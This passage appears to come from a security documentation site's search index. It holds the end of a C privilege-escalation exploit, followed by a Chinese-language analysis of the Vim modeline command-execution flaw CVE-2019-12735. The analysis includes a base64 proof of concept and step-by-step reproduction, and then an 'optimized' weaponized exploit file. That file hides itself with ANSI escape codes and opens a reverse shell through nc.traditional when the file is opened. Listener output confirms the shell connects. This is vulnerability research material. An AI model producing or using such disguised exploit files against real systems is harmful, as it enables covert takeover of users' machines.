exploit!\\n\");\n\n\npreReturnCleanup:\n  if(namespacedProcessPid>0) {\n    if(killNamespacedProcessFlag) {\n      kill(namespacedProcessPid, SIGKILL);\n    } else {\n// We used an existing namespace or chroot to escalate. Remove\n// the files created there.\n      fprintf(stderr, \"No namespace cleanup for preexisting namespaces yet, do it manually.\\n\");\n    }\n  }\n\n\n  if(!exitStatus) {\n    fprintf(stderr, \"Cleanup completed, re-invoking binary\\n\");\n    invokeShell(\"/proc/self/exe\");\n    exitStatus=1;\n  }\n  return(exitStatus);\n\n\nescalateOk:\n  exitStatus=0;\n  goto preReturnCleanup;\n}",
            "title": "exp\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/",
            "text": "Vim modeline\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790(cve-2019-12735)\n\n\n0.\u4f5c\u8005\n\n\ninvincible1944@gmail.com\n\n\n1.\u80cc\u666f\u4ecb\u7ecd\n\n\n\n\n\n\n\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6\uff1aVim/NeoVim \n\n\n\n\n\n\nVim/NeoVim \u7b80\u4ecb\n\n\n\n\nVim\u662f\u4ecevi\u53d1\u5c55\u51fa\u6765\u7684\u4e00\u4e2a\u6587\u672c\u7f16\u8f91\u5668\uff0c\u662fLinux \u5e73\u53f0\u6700\u5e38\u7528\u7684\u7f16\u8f91\u5668\u4e4b\u4e00\u3002\n\n\n\n\nNeovim \u662fVim\u7684\u4e00\u4e2a\u91cd\u6784\u7248\u672c\uff0c\u81f4\u529b\u4e8e\u6210\u4e3aVim\u7684\u8d85\u96c6\uff08superset\uff09\uff0c\n\n\n\n\n\n\nNeovim\u7684\u7b2c\u4e00\u4e2a\u7248\u672c\u57282015\u5e7412\u6708\u53d1\u884c\uff0c\u5e76\u4e14\u80fd\u591f\u5b8c\u5168\u517c\u5bb9Vim\u7684\u7279\u6027\u3002 \n\n\n\n\n\n\n\u76f8\u6bd4\u4e8eVim\uff0cNeovim\u7684\u4e3b\u8981\u6539\u8fdb\u5728\u4e8e\u5176\u652f\u6301\u5f02\u6b65\u52a0\u8f7d\u63d2\u4ef6\u3002\n\n\n\n\n\n\n\n\n\n\n\u6f0f\u6d1e\u5371\u5bb3\uff1a\u6253\u5f00\u6076\u610f\u6784\u9020\u7684\u6587\u672c\u6587\u4ef6\uff0c\u53ef\u4ee5\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u5f53\u524d\u7528\u6237\u6743\u9650\u3002\n\n\n\n\n\n\n\u76f8\u5173\u80cc\u666f\u77e5\u8bc6\uff1a\u89c1\u9644\u4ef6\uff0ccve-2019-12735-01\n\n\n\n\n\n\n2.\u6f0f\u6d1e\u5206\u6790\n\n\n\n\n\n\n\u6f0f\u6d1e\u539f\u7406\uff1a\n    Vim \u7684sandbox\u5bf9\u8f93\u5165\u7684\u547d\u4ee4\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u53ef\u4ee5\u901a\u8fc7source\u547d\u4ee4\u52a0\u8f7d\u5176\u4ed6Vim\u811a\u672c\u7ed5\u8fc7\u6c99\u7bb1\u6267\u884c\uff0c\u914d\u5408\u4e0amodeline\u7279\u6027\uff0c\u53ef\u4ee5\u5728Vim\u6253\u5f00\u666e\u901a\u6587\u4ef6\u65f6\u5b9e\u73b0OS command injection\u3002\n\n\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c\n\n\n\n\n\n\n\u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1a\nVim <= 8.1.1365/ NeoVim  <= 0.3.6\n\n\n\n\n\n\n\u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a\nVim 81/src/getchar.c -> openscript\n\n\n\n\n\n\nVim\u5b98\u7f51\n\n\n\n\n\n\nVim\u6e90\u7801\u5e93\n\n\n\n\n\n\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\uff1a\nCWE-78 OS Command Injection\n\n\n\n\n\n\n\u6f0f\u6d1e\u8865\u4e01\uff1a\nVim patch\n\n\n\n\n\n\n\u6f0f\u6d1eCVE\u53f7\uff1a\nCVE-2019-12735\n\n\n\n\n\n\n3. POC\n\n\na. POC\u539f\u7406\n\n\n\n\n\n\n\u80cc\u666f\u7b80\u4ecb\n\n\n\n\nVim\u53ef\u4ee5\u901a\u8fc7Vim\u811a\u672c\u7f16\u5199\u63d2\u4ef6\uff0c\u901a\u8fc7\nsource[!]\n\u547d\u4ee4\u52a0\u8f7d\u548c\u6267\u884c\u811a\u672c\n\n\nVim\u652f\u6301\u901a\u8fc7Vim command\u6216\u8005Vim\u811a\u672c\u6267\u884cshell\u6307\u4ee4\n\n\nvim\u652f\u6301\u901a\u8fc7\u8868\u8fbe\u5f0f(\u53ef\u4ee5\u7406\u89e3\u4e3a\u77ed\u811a\u672c)\u5bf9\u6587\u672c\u8fdb\u884c\u8bbe\u7f6e(\u6bd4\u5982folding\u4ee3\u7801\u5757\u6298\u53e0\u663e\u793a\u529f\u80fd)\n\n\n\u8868\u8fbe\u5f0f\u652f\u6301Vim\u6307\u4ee4\uff0c\u4f46\u662f\u4f1a\u5728\u81ea\u5df1\u7684sandbox\u6267\u884c\uff0c\u53ea\u8f93\u51fa\u6267\u884c\u7ed3\u679c\n\n\nVim\u8868\u8fbe\u5f0f\u4e2d\u5b58\u5728\u4e00\u4e9b\u81ea\u5e26\u7684\u51fd\u6570\nexecute, assert_fails\n\u7b49\uff0c\u53ef\u4ee5\u5c06Vim command\u4f5c\u4e3a\u53c2\u6570\u6267\u884c\u3002\n\n\n\u7531\u4e8e\u9650\u5236\u4e0d\u4e25\u683c\uff0c\u5f53\u8868\u8fbe\u5f0f\u901a\u8fc7execute, assert_fails\u8fd9\u7c7b\u51fd\u6570\u6267\u884csource\u547d\u4ee4\u65f6\uff0c\u4f1a\u5728sandbox\u4e2d\u6267\u884c\uff0c\u4f46\u662fsource \u52a0\u8f7d\u7684Vim\u811a\u672c\u5219\u4f1a\u5728\u6b63\u5e38\u8fdb\u7a0b\u73af\u5883\u4e2d\u6267\u884c\n\n\nVim\u7684modeline\u529f\u80fd\u662f\u7528\u4e8e\u5bf9\u5355\u4e2a\u6587\u4ef6\u8fdb\u884c\u81ea\u52a8\u914d\u7f6e\u7684\uff0c\u5e76\u4e14\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u5e26\u6709\u8868\u8fbe\u5f0f\u7684\u914d\u7f6e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5229\u7528\u6b64\u7279\u6027\u5728Vim\u6253\u5f00\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u6587\u672c\u65f6\u5b9e\u73b0OS command injection.\n\n\n\n\n\n\n\n\nPoc\u539f\u7406\n\n\n\u8981\u7406\u89e3Poc\u7684\u539f\u7406\uff0c\u9700\u8981\u6709\u4e00\u4e9bVim\u76f8\u5173\u7684\u80cc\u666f\u77e5\u8bc6\uff0c\u89c1\u9644\u4ef6: cve-2019-12735-01\n\n\n\u4e0b\u9762\ud83d\udc47\u662fPoc\u7684\u6d41\u7a0b\uff1a\n\n\n\n\n\n\nvim \u6253\u5f00poc\u6587\u4ef6\uff0c\u8bc6\u522b\u51fa\u6587\u4ef6\u9996\u90e8\u7684modeline\n\n\n\n\n\n\n\u8df3\u8fc7\u5f00\u5934\u7684text\uff0c\u4ece\n\"vi:\"\n\u540e\u9762\u5f00\u59cb\u4f9d\u6b21\u52a0\u8f7d\u914d\u7f6e\u9009\u9879\n\n\n\n\n\n\n\u52a0\u8f7d\u5230fde\u9009\u9879\u65f6\uff0c\u6267\u884c\u8868\u8fbe\u5f0f\u4e2d\u7684\nassert_fails\n\u51fd\u6570\uff0c\u8fdb\u800c\u6267\u884c\nsource! %\n\u6307\u4ee4\n\n\n\n\n\n\nsource! %\n\u5c06\u5f53\u524d\u6587\u4ef6\u4f5c\u4e3aVim\u811a\u672c\u52a0\u8f7d\u5e76\u6267\u884c\n\n\n\n\n\n\nVim\u811a\u672c\u7684\u5185\u5bb9\u5c31\u662fPoc\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6b21\u4e0e\u76f4\u63a5\u6253\u5f00\u4e0d\u540c\uff0c\u662f\u4f5c\u4e3a\u811a\u672c\u52a0\u8f7d\uff0c\u6240\u4ee5\u6587\u4ef6\u5185\u5bb9\u4e0d\u4f1a\u88ab\u8bc6\u522b\u4e3amodeline\uff0c\u800c\u662f\u8bc6\u522b\u4e3aVim\u811a\u672c\uff0c\u5177\u4f53\u542b\u4e49\u662f\u6267\u884cshell\u547d\u4ee4\nuname -a || \"some text\"\n\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c\n\n\n\n\n\n\n\n\n\n\n\u8c03\u7528\u6808\u4fe1\u606f\n\n\n\n\n\n\n#0  openscript (\n    name=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \n    directly=0x0) at getchar.c:1415\n#1  0x000000000046e06f in cmd_source (\n    fname=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \n    eap=0x7fffffffc5c0) at ex_cmds2.c:3502\n#2  0x000000000046dfd8 in ex_source (eap=0x7fffffffc5c0) at ex_cmds2.c:3484\n...\n#4  0x0000000000470d89 in do_cmdline (cmdline=0x87ea80 \"source! %\", \n...\n#7  0x00000000004395ec in call_func (\n    funcname=0x884d40 \"assert_fails(\\\"source! %\\\")\", len=0xc, \n...\n#9  0x00000000004337f8 in eval7 (arg=0x7fffffffd680, rettv=0x7fffffffd6c0, \n...\n#16 0x000000000043189b in eval0 (arg=0x884d40 \"assert_fails(\\\"source! %\\\")\", \n#17 0x000000000042cc06 in eval_foldexpr (\n    arg=0x884d40 \"assert_fails(\\\"source! %\\\")\", cp=0x7fffffffd70c)\n#18 0x00000000004a8403 in foldlevelExpr (flp=0x7fffffffd7b0) at fold.c:3032\n...\n#26 0x000000000040e02f in chk_modeline (lnum=0x1, flags=0x0) at buffer.c:5234\n#27 0x000000000040dba6 in do_modelines (flags=0x0) at buffer.c:5115\n...\n#30 0x00000000005e8db0 in main (argc=0x2, argv=0x7fffffffde98) at main.c:881\n...\n\n\n\n\n\nb.POC\u6e90\u7801\n\n\n$ echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt\n$ cat poc.txt \n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n$vim poc.txt\n\n\n\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u590d\u73b0\u73af\u5883\n\n\n\n\n\n\n\u73af\u5883\u6e05\u5355\n\n\n\n\n\u7cfb\u7edf\u7248\u672c: Ubuntu-16.04.6 LTS (Xenial Xerus)\n\n\nVim\u7248\u672c: VIM - Vi IMproved 7.4 \n\n\nVim package \u7248\u672c:  2:7.4.1689-3ubuntu1\n\n\n\u955c\u50cf\u4e0b\u8f7d\u5730\u5740: https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/14.04.6/ubuntu-14.04.6-desktop-amd64.iso\n\n\n\n\n\n\n\n\nQEMU\u865a\u62df\u673a\u642d\u5efa\u6b65\u9aa4\uff1a\n\n\n\n\n\n\n\n\n\n\n#  \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n$ qemu-img create -f qcow2 ubuntu16.04.6.img 10G\n\n# \u5b89\u88c5\u865a\u62df\u673a\n$ qemu-system-x86_64  -m 2048 -hda ubuntu16.04.6.img -cdrom ./ubuntu-16.04.6-desktop-amd64.iso\n\n# \u542f\u52a8\u865a\u62df\u673a\n$ qemu-system-x86_64 -m 2048  ubuntu16.04.6.img\n\n\n\n\n\n\nStep1 - \u5b89\u88c5nc.traditional\n\n    \u5efa\u7acb\u4f1a\u8bdd\u7684\u65b9\u5f0f\u5f88\u591a\uff0c\u8fd9\u4e00\u6b65\u53ea\u662f\u4e3a\u4e86\u6f14\u793aexp\u9700\u8981\u3002\n\n\n\n\nsudo apt-get install netcat-traditional\n\n\n\n\n\n\nStep2 - \u5b89\u88c5\u542b\u6f0f\u6d1e\u7248\u672c\u7684Vim\n\n\n\n\n$ sudo apt-get install vim-runtime=2:7.4.1689-3ubuntu1\n$ sudo apt-get install vim-common=2:7.4.1689-3ubuntu1\n$ sudo apt-get install vim=2:7.4.1689-3ubuntu1\n\n\n\n\n\n\nStep3 - \u68c0\u67e5Vim\u914d\u7f6e\u662f\u5426\u5f00\u542fmodeline\uff0c\u82e5\u6ca1\u6709\u5219\u914d\u7f6eVim\n\n\n\n\n# \u68c0\u67e5modeline\u914d\u7f6e\nvim\n:verbose set modeline? set modelines?\n# \u5982\u679c\u663e\u793anomodeline\u6216\u8005nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e\n\n# \u914d\u7f6e\u65b9\u6cd5\uff1a\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n:wq\n\n\n\n\n\n\n\nStep4 - \u521b\u5efapoc\u6587\u4ef6\n\n\n\n\necho \"G1s/OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt\n\n# base64\u7f16\u7801\u660e\u6587\uff1a\n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\\n\n\n\n\n\n\n\n\nStep5 - \u7528vim\u6253\u5f00\u89e6\u53d1\u547d\u4ee4\u6267\u884c\n(uname -a)\n\n\n\n\n$ vim poc.txt \n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n\n\n\n\n4. EXP\n\n\na. EXP\u539f\u7406\n\n\n\n\n\n\nExp\u662f\u4e00\u6761\u7cbe\u5fc3\u6784\u9020\u7684modeline\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u628a\u6076\u610f\u6587\u4ef6\u4f2a\u9020\u6210\u6b63\u5e38\u6587\u672c\uff0c\u6d88\u9664\u75d5\u8ff9\uff1b \n\n\n\n\n\n\n\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97Vim\uff0c\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\uff0c\u9690\u85cf\u6076\u610f\u6587\u672c\u5185\u5bb9\uff1b\n\n\n\n\n\n\n\u53e6\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97cat\uff0c\u4f7f\u6587\u672c\u6253\u5f00\u65f6\u770b\u8d77\u6765\u662f\u6b63\u5e38\u6587\u672c\uff1b\n\n\n\n\n\n\n\u4e3b\u8981\u901a\u8fc7ANSI Escape Code\u6765\u5b9e\u73b0\u8fd9\u4e9b\u9690\u85cf\u529f\u80fd\u3002\n\n\n\n\n\n\nVim\u52a0\u8f7dexp\u6587\u4ef6\u540e\u7b49\u540c\u4e8e\u6267\u884c\u4e0b\u9762\u7684\u5e8f\u5217\uff1a\n\n\n# modeline\u89e6\u53d1\u6267\u884c\u81ea\u52a8\u914d\u7f6e\n:set fen\n:set fdm=expr\n:set fde=assert_fails('set\\ fde=x\\ \\|\\ source\\!\\ \\%')\n:set fdl=0\n\n# fde=assert_fails\u89e6\u53d1\u4e86assert_fails\u51fd\u6570\u8c03\u7528\n:call assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\')\n\n# assert_fails\u51fd\u6570\u6267\u884cvim\u547d\u4ee4\n:set fde=x | source! %\n\n# source! % \u52a0\u8f7d\u5f53\u524d\u6587\u4ef6\uff0c\u5e76\u89c6\u4e3aVim Ex mode\u4e0b\u7684\u811a\u672c\u6267\u884c\uff1a\n<ESC>\nS\nNothing here.\n<ESC>\n:silent! w\n:call system('nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &') \n:redraw! \n:file \n:silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[KNothing here.\"\\x16\\x1b[D \\n\n\n# \u8bfb\u53d6\u5230\u6362\u884c\u7b26\u53f7\u540e\\n\u6267\u884c\u4e0a\u9762\u7b2c\u4e00\u4e2asilent!\u4ee5\u53ca\u540e\u9762\u7684\u547d\u4ee4\n# \u901a\u8fc7vim\u7684system\u51fd\u6570\u6267\u884c\u4e86\u7cfb\u7edf\u547d\u4ee4,\u5efa\u7acb\u53cd\u5f39shell\n\n\n\n\n\n\u9010\u6761\u89e3\u91ca\uff1a\n\n\n# exp.txt: \n\\x1b[?7l\\x1bSNothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n\n\n# \u4e0b\u6587\u62ec\u53f7\u4e2d\u7684c\u8868\u793a\u7528\u4e8e\u6b3a\u9a97cat\uff0cv\u8868\u793aVim\u811a\u672c\u6b63\u5e38\u6307\u4ee4\n\n\\x1b[?7l (c)\n# \u5173\u95ed\u81ea\u52a8\u6362\u884c\n# \u914d\u5408\\x1b[1G\u548c\\x1b[K\u4f7f\u7528\uff0c\u89c1\u4e0b\u6587\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206\n\n\\x1bS (v)\n# <ESC>S \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\u548cS\u952e\n# \u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u4eceNormal mode\u5207\u6362\u5230Insert mode\n# \u7ecf\u6d4b\u8bd5\uff0c\u8fd9\u91cc\u7684\\x1b\u662f\u53ef\u4ee5\u53bb\u6389\u7684\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206\n\nNothing here. (v)\n# \u5728Insert mode\u4e0b\u5199\u5165\u5b57\u7b26\u4e32 Nothing here.\n\n\\x1b (v)\n# \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\uff0c\u9000\u51faInsert mode \u8fd4\u56deNormal mode\n\n:  (v)\n# \u4eceNormal mode\u8fdb\u5165Command-line mode\n\nsilent! w (v)\n# \u4fdd\u5b58\u5199\u5165\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u5173\u95ed\u56de\u663e\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n| call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') (v)\n# \u8c03\u7528system \u51fd\u6570\u6267\u884cShell\u547d\u4ee4\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n| redraw! (v)\n# \u6e05\u9664\u56de\u663e\u4fe1\u606f\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n| file | silent! [some text] (v)\n# \u663e\u793a\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\uff0csilent!\u7528\u4e8e\u6e05\u9664\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4ea7\u751f\u7684\u62a5\u9519\u4fe1\u606f\n# \u6700\u540e\u7684\u6548\u679c\u5c31\u662f\u5c4f\u5e55\u5e95\u90e8\u663e\u793a\u7684\u662ffile\u7684\u6267\u884c\u7ed3\u679c\n\nvim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: (v)\n# vim\u52a0\u8f7d\u65f6modeline\u7684\u6b63\u6587\u90e8\u5206\n# fen foldenable, \u5f00\u542f\u4ee3\u7801\u6298\u53e0folding\u529f\u80fd\n# fdm foldmethod, \u8bbe\u7f6efolding\u65b9\u6cd5\u4e3aexpr\n# fde foldexpr, \u8bbe\u7f6efold expression\n# assert_fails Vim\u7684\u5185\u90e8\u51fd\u6570\uff0c\u53ef\u4ee5\u6267\u884c\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u7684vim\u547d\u4ee4\uff0c\u5177\u4f53\u89c1\u9644\u4ef6\n# \u6b64\u5904\u6267\u884c\u4e86\u4e24\u4e2a\u547d\u4ee4\uff1a\n# set fde \u628afoldexpr\u8bbe\u7f6e\u4e3ax(\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u4e3a\u65e0\u6548)\n# source % \u628a\u5f53\u524d\u6587\u4ef6\u89c6\u4e3avim\u811a\u672c\uff0c\u52a0\u8f7d\u5e76\u6267\u884c\n# fdl foldlevel \u8bbe\u7f6e\u4e3a0\u8868\u793a\u6240\u6709\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u90fd\u6298\u53e0\u663e\u793a(\u4e0eexp\u65e0\u5173)\n\n\\x16 (v) \n# \u8fd9\u4e2a\u5f88\u5173\u952e\uff0c\u7531\u4e8e\u662f\u7528source! %\u6253\u5f00\uff0c\u6240\u4ee5\u6587\u672c\u7684\u5185\u5bb9\u90fd\u4f1a\u8bc6\u522b\u6210\u5728Normal mode\u4e0b\u7684\u8f93\u5165\uff0c\u6bd4\u5982\\x1b\u5c31\u662f\u6309\u4e0b<ESC>, S\u5c31\u4ee3\u8868\u6309\u4e0b\u952e\u76d8(shift+s)\uff0c\u800c\u5f53\u6267\u884c\u5230\u7b2c\u4e8c\u4e2asilent! \u4e4b\u540e\uff0c\u540e\u9762\u7684\u5b57\u7b26\u4e32\u76f4\u5230'\\n'\u6211\u4eec\u5e0c\u671b\u5b83\u4eec\u88ab\u5ffd\u7565\uff0c\u4f46\u662f\u4e3a\u4e86\u6784\u9020cat\u7684\u8f93\u51fa, \u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e86\u5f88\u591aescape code\u6bd4\u5982\\x1b[D, \u4f46\u662f\u8fd9\u4e9b\u4e5f\u4f1a\u88ab\u8bc6\u522b\u6210\u952e\u76d8\u7684\u6309\u952e\u64cd\u4f5c\uff0c\u5bfc\u81f4\u6574\u4e2a\u6307\u4ee4\u90fd\u65e0\u6cd5\u6267\u884c \u800c\\x16\u6b63\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u4f1a\u628a\u4e0b\u4e00\u4e2a\u6309\u952e\u89e3\u6790\u6210\u5b57\u7b26\u800c\u4e0d\u4f1a\u8ba9\u5b83\u6267\u884c\u6309\u952e\u529f\u80fd\uff0c\u5177\u4f53\u5206\u6790\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\n\\x1b[1G (c)\n# cat\u6253\u5f00\u65f6\u5019\uff0c\u5c06\u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u9996\u90e8\n# \u914d\u5408\\x1b[K\u548c\\x1b[?7l\uff0c\u89c1\u4e0b\u6587\n# \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\\x16 (v)\n# \u4f5c\u7528\u540c\u4e0a\n\n\\x1b[2K (c)\n# \u914d\u5408\\x1b[1G\u548c\\x1b[?7l\uff0c\u5220\u9664\u5f53\u524d\u4f4d\u7f6e\u5230\u884c\u9996\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c\uff0c\u53ea\u6539\u53d8\u8f93\u51fa\u5185\u5bb9)\n# \u7ecf\u8fc7\u8fd9\u4e2a\u5904\u7406\uff0ccat\u7684\u67e5\u770b\u7ed3\u679c\u5c31\u53ea\u5269\u4e0b\u540e\u9762\u7684\u4fe1\u606f\u4e86\n# \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\nNothing here.\" (c)\n# \u51c6\u5907\u8ba9cat\u67e5\u770b\u6587\u4ef6\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\uff0c\u4e0eVim\u6253\u5f00\u6587\u4ef6\u65f6\u67e5\u770b\u5230\u7684\u5185\u5bb9\u76f8\u540c\n\n\\x16 (v)\n# \u4f5c\u7528\u540c\u4e0a\n\n\\x1b[2D (c) \n# \u5149\u6807\u5411\u524d\u79fb\u52a82\u4f4d\n# \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n  \\n (c&v)\n# \u56e0\u4e3a\u5149\u6807\u524d\u79fb,\u4e24\u4e2a\u7a7a\u683c\u4f1a\u8986\u76d6Nothing here.\" \u5b57\u7b26\u4e32\u6700\u540e\u7684\u5f15\u53f7\"\u548c\\x16\n# \u4e8e\u662fcat\u7684\u8f93\u51fa\u53ea\u5269\u4e0b \\x16Nothing here.\\n\n# \\n\u6362\u884c\u89e6\u53d1 silent! w | ... | file | silent! [some text]  \u6574\u6761\u547d\u4ee4\u7684\u6267\u884c\n# \u5176\u4e2dcall system\u5b8c\u6210\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u5efa\u7acb\u53cd\u5f39shell\n\n\n\n\n\n\nb. EXP\u6e90\u7801\n\n\n\u539f\u4f5c\u8005exp: \nshell.txt\n\n\n\u4f18\u5316\u8fc7\u7684exp: \n\n\necho \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt\n\n# base64\u7f16\u7801\u5bf9\u5e94\u7684\u660e\u6587\n\\x1b[?7l\\x1bS Nothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n\n\n# \u4fee\u6539\u4e86\u56db\u5904\n# \u4fee\u6539\u539f\u56e0\u89c1\u9644\u4ef6\n# nc -> nc.traditional \n# \\x1b[K -> \\x1b[2K \n# \\x1b[D -> \\x1b[2D \n#  \\n  ->   \\n (\u589e\u52a0\u4e86\u4e00\u4e2a\u7a7a\u683c)\n\n\n\n\n\nc. \u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePoc\u76f8\u540c\n\n\n\n\n\n\nStep1 - \u521b\u5efaexp\u6587\u4ef6\n\n\n\n\n\n\n$ echo \"G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK\" | base64 --decode > exp.txt\n\n\n\n\n\n\n\nStep2 - \u76d1\u542cnc\u56de\u8fde\u7aef\u53e3\n\n\n\n\n$ nc -vlp 9999\nListening on [0.0.0.0] (family 0, port 9999)\n\n\n\n\n\n\n\nStep3 - Vim\u6253\u5f00exp\u6587\u4ef6\n\n\n\n\n$ vim exp.txt\n Nothing here.\n~                                                                      \n...                                                                     \n~                                                                               \n\"exp.txt\" line 1 of 1 --100%-- col 14\n\n\n\n\n\n\n\n\u4f1a\u8bdd\u5efa\u7acb\u6210\u529f\n\n\n\n\n$ nc -vlp 9999\nListening on [0.0.0.0] (family 0, port 9999)\nConnection from [127.0.0.1] port 9999 [tcp/*] accepted (family 2, sport 